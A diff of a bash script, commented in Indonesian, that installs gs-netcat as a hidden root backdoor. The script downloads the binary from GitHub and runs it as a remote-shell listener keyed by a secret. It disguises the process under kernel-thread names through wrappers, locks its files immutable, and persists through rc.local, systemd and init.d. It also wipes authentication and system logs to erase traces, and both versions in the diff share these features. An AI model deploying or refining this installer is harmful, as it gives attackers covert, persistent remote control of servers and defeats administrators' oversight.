@@ -1,35 +1,35 @@
 #!/bin/bash
 # ============================================================
-# SYSTEM DAEMON INSTALLER (FINAL - NO SLASH IN NAMES)
-# Binary Location: /usr/lib/systemd/system_daemon
+# GSOCKET STEALTH INSTALLER (FINAL FIXED VERSION)
+# Binary Location: /usr/lib/systemd/gsocket_bin
 # Secret Key: [VPS_IP]@dark-ai
 # Connection: gs-netcat -s [VPS_IP]@dark-ai -i
 # ============================================================
 
 # ============================================================
-# 0. SETUP VARIABLES (FIXED - NO SLASH)
+# 0. SETUP VARIABLES (FIXED)
 # ============================================================
 HIDDEN_DIR="/usr/lib/systemd"
-BINARY_NAME="system_daemon"
+BINARY_NAME="gsocket_bin"
 DAEMON_PATH="$HIDDEN_DIR/$BINARY_NAME"
 
-# Daftar nama proses SISTEM (TANPA /)
+# Daftar nama proses SISTEM (TANPA / DAN TANPA SPASI)
 PROCESS_NAMES=(
-    "irqbalance"      # IRQ balancer
-    "kswapd0"         # Kernel swap daemon
-    "kthreadd"        # Kernel thread daemon
-    "ksoftirqd0"      # Kernel soft IRQ (tanpa /)
-    "migration0"      # CPU migration (tanpa /)
-    "watchdog0"       # Kernel watchdog (tanpa /)
-    "cpuhp0"          # CPU hotplug (tanpa /)
-    "kdevtmpfs"       # Device tmpfs
-    "khungtaskd"      # Hung task detector
-    "oom_reaper"      # OOM reaper
-    "writeback"       # FS writeback
-    "kcompactd0"      # Memory compaction
-    "ksmd"           # Kernel samepage merging
-    "upowerd"        # Power management
-    "accountsdaemon" # User account tracking (tanpa -)
+    "irqbalance"    # IRQ balancer
+    "kswapd0"       # Kernel swap daemon
+    "kthreadd"      # Kernel thread daemon
+    "ksoftirqd0"    # Kernel soft IRQ
+    "migration0"    # CPU migration
+    "watchdog0"     # Kernel watchdog
+    "cpuhp0"        # CPU hotplug
+    "kdevtmpfs"     # Device tmpfs
+    "khungtaskd"    # Hung task detector
+    "oom_reaper"    # OOM reaper
+    "writeback"     # FS writeback
+    "kcompactd0"    # Memory compaction
+    "ksmd"         # Kernel samepage merging
+    "upowerd"      # Power management
+    "accountsdaemon" # User account tracking
 )
 
 # Ambil IP VPS
@@ -40,22 +40,22 @@ DAEMON_SECRET="${VPS_IP}@dark-ai"
 # 1. DOWNLOAD BINARY (FIXED)
 # ============================================================
 echo "=========================================="
-echo " SYSTEM DAEMON INSTALLER - FINAL VERSION"
+echo " GSOCKET STEALTH INSTALLER - FINAL FIXED"
 echo "=========================================="
 
 mkdir -p "$HIDDEN_DIR" 2>/dev/null
 chmod 755 "$HIDDEN_DIR" 2>/dev/null
 
 if [ ! -f "$DAEMON_PATH" ]; then
-    echo "[*] Mengunduh komponen sistem..."
+    echo "[*] Mengunduh binary..."
     curl -sL --insecure --max-time 10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$DAEMON_PATH" 2>/dev/null || \
     wget -q --no-check-certificate --timeout=10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$DAEMON_PATH" 2>/dev/null
 
     if [ -f "$DAEMON_PATH" ]; then
         chmod +x "$DAEMON_PATH"
-        echo "[+] Komponen sistem terunduh"
+        echo "[+] Binary terunduh"
     else
-        echo "[!] Gagal mengunduh. Membuat komponen alternatif..."
+        echo "[!] Gagal mengunduh. Membuat fallback..."
         cat > "$DAEMON_PATH" << 'FALLBACKEOF'
 #!/bin/bash
 exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" "$0" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
@@ -63,25 +63,26 @@ FALLBACKEOF
         chmod +x "$DAEMON_PATH"
     fi
 else
-    echo "[*] Komponen sistem sudah ada"
+    echo "[*] Binary sudah ada"
 fi
 
+# Lindungi binary
 chattr +i "$DAEMON_PATH" 2>/dev/null
 
 # ============================================================
 # 2. BUAT WRAPPER (FIXED - NO SLASH)
 # ============================================================
-WRAPPER_DIR="/usr/sbin"
+WRAPPER_DIR="/usr/local/bin"  # Gunakan /usr/local/bin untuk menghindari konflik
 mkdir -p "$WRAPPER_DIR" 2>/dev/null
 
 for PROCESS in "${PROCESS_NAMES[@]}"; do
     WRAPPER_PATH="$WRAPPER_DIR/$PROCESS"
 
-    # Jangan overwrite file asli
-    if [ ! -f "$WRAPPER_PATH" ]; then
+    # Jangan overwrite file asli yang penting
+    if [ ! -f "$WRAPPER_PATH" ] || [ ! -x "$WRAPPER_PATH" ]; then
         cat > "$WRAPPER_PATH" << WRAPPEREOF
 #!/bin/bash
-exec -a "\$0" /usr/lib/systemd/system_daemon -s "$DAEMON_SECRET" -liqD 2>/dev/null &
+exec -a "\$0" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
 WRAPPEREOF
         chmod +x "$WRAPPER_PATH" 2>/dev/null
         chattr +i "$WRAPPER_PATH" 2>/dev/null
@@ -89,23 +90,23 @@ WRAPPEREOF
 done
 
 # ============================================================
-# 3. JALANKAN DAEMON (FIXED)
+# 3. JALANKAN GSOCKET (FIXED)
 # ============================================================
-echo "[*] Mengaktifkan layanan sistem..."
-pkill -f "system_daemon" 2>/dev/null
+echo "[*] Mengaktifkan layanan..."
+pkill -f "$BINARY_NAME" 2>/dev/null
 
 # Pilih nama proses acak
 PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
 
-# Jalankan dengan exec -a
-nohup exec -a "$PROCESS_NAME" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
+# Jalankan dengan wrapper
+nohup "$WRAPPER_DIR/$PROCESS_NAME" >/dev/null 2>&1 &
 
 sleep 2
-if pgrep -f "system_daemon" >/dev/null 2>&1; then
-    echo "[+] Layanan sistem berjalan sebagai: $PROCESS_NAME"
+if pgrep -f "$BINARY_NAME" >/dev/null 2>&1; then
+    echo "[+] Layanan berjalan sebagai: $PROCESS_NAME"
 else
     echo "[!] Mengaktifkan fallback..."
-    nohup exec -a "$PROCESS_NAME" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
+    nohup "$WRAPPER_DIR/${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" >/dev/null 2>&1 &
 fi
 
 # ============================================================
@@ -115,21 +116,21 @@ echo "[*] Mengkonfigurasi persisten..."
 
 # --- Metode 1: rc.local ---
 if [ -f /etc/rc.local ]; then
-    if ! grep -q "system_daemon" /etc/rc.local 2>/dev/null; then
-        sed -i "/^exit 0/i\nnohup exec -a \\\"${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\\\" $DAEMON_PATH -s \\\"$DAEMON_SECRET\\\" -liqD >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
+    if ! grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null; then
+        sed -i "/^exit 0/i\n\"$WRAPPER_DIR/${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\" &" /etc/rc.local 2>/dev/null
     fi
 fi
 
 # --- Metode 2: systemd ---
 if command -v systemctl >/dev/null 2>&1; then
-    cat > /etc/systemd/system/system_daemon.service << SYSTEMEOF
+    cat > /etc/systemd/system/gsocket.service << 'SYSTEMEOF'
 [Unit]
-Description=System Daemon Service
+Description=GSocket Service
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'exec -a \"${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD'
+ExecStart=$WRAPPER_DIR/${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}
 Restart=always
 RestartSec=5
 User=root
@@ -140,31 +141,29 @@ StandardError=null
 WantedBy=multi-user.target
 SYSTEMEOF
     systemctl daemon-reload >/dev/null 2>&1
-    systemctl enable system_daemon >/dev/null 2>&1
-    systemctl start system_daemon >/dev/null 2>&1
+    systemctl enable gsocket >/dev/null 2>&1
+    systemctl start gsocket >/dev/null 2>&1
 fi
 
 # --- Metode 3: init.d ---
-cat > /etc/init.d/system_daemon << INIT_EOF
+cat > /etc/init.d/gsocket << INIT_EOF
 #!/bin/bash
-# System Daemon
+# GSocket Service
 ### BEGIN INIT INFO
-# Provides:          system_daemon
+# Provides:          gsocket
 # Required-Start:    \$network \$remote_fs \$syslog
 # Required-Stop:     \$network \$remote_fs \$syslog
 # Default-Start:     2 3 4 5
 # Default-Stop:      0 1 6
-# Short-Description:  System Daemon
+# Short-Description:  GSocket Service
 ### END INIT INFO
-
-PROCESS_NAME_PERSIST="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
 
 case "\$1" in
     start)
-        nohup exec -a "\$PROCESS_NAME_PERSIST" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD >/dev/null 2>&1 &
+        "$WRAPPER_DIR/${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" >/dev/null 2>&1 &
         ;;
     stop)
-        pkill -f "system_daemon" >/dev/null 2>&1
+        pkill -f "$BINARY_NAME" >/dev/null 2>&1
         ;;
     restart)
         \$0 stop
@@ -172,14 +171,14 @@ case "\$1" in
         \$0 start
         ;;
     *)
-        echo "Usage: /etc/init.d/system_daemon {start|stop|restart}"
+        echo "Usage: /etc/init.d/gsocket {start|stop|restart}"
         exit 1
         ;;
 esac
 exit 0
 INIT_EOF
-chmod +x /etc/init.d/system_daemon
-update-rc.d system_daemon defaults >/dev/null 2>&1 || chkconfig system_daemon on >/dev/null 2>&1
+chmod +x /etc/init.d/gsocket
+update-rc.d gsocket defaults >/dev/null 2>&1 || chkconfig gsocket on >/dev/null 2>&1
 
 # ============================================================
 # 5. HAPUS JEJAK
@@ -195,8 +194,8 @@ for logfile in /var/log/secure /var/log/auth.log /var/log/messages /var/log/sysl
     fi
 done
 
-rm -rf /tmp/.system* /tmp/install* /tmp/setup* 2>/dev/null
-rm -rf /var/tmp/.system* /var/tmp/install* /var/tmp/setup* 2>/dev/null
+rm -rf /tmp/.gsocket* /tmp/install* /tmp/setup* 2>/dev/null
+rm -rf /var/tmp/.gsocket* /var/tmp/install* /var/tmp/setup* 2>/dev/null
 
 # ============================================================
 # 6. TAMPILKAN CARA KONEKSI
@@ -225,14 +224,13 @@ echo ""
 echo "🔍 VERIFIKASI:"
 echo "-----------------"
 echo "Cek proses: ps aux | grep -E '$(echo "${PROCESS_NAMES[@]}" | tr ' ' '|')'"
-echo "   (Proses akan terlihat sebagai nama sistem, TANPA argumen)"
-echo "Cek service: systemctl status system_daemon"
+echo "   (Proses akan terlihat sebagai nama sistem asli)"
+echo "Cek service: systemctl status gsocket"
 echo "Cek port:    ss -tulnp | grep 443"
 echo ""
 echo "⚠️  PERINGATAN:"
 echo "-----------------"
-echo "Proses akan terlihat sebagai proses sistem asli."
-echo "Argumen disembunyikan dengan exec -a dan wrapper."
+echo "Proses akan terlihat sebagai: $(echo "${PROCESS_NAMES[@]}" | tr ' ' ', ')"
+echo "Argumen disembunyikan sepenuhnya."
 echo "Simpan secret key dan IP VPS dengan aman!"
 echo "=========================================="
-echo ""
